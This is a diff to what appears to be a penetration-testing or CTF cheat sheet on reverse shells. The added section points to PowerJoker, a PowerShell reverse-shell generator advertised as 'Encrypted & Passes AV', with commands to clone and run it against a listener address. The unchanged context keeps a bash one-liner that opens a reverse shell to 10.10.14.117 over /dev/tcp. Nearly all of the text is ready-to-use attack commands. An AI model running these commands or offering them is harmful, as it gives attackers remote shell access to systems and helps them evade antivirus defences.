@@ -3,6 +3,13 @@
 
 #### Generator
 https://www.revshells.com/
+#### Powershell generator
+Encrypted & Passes AV
+https://github.com/Adkali/PowerJoker
+```bash
+git clone https://github.com/Adkali/PowerJoker && cd Powerjoker
+python3 PowerJoker.py -l 10.10.16.84 -p 1337
+```
 #### Basic bash shell
 ```bash
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.117/4444 0>&1'
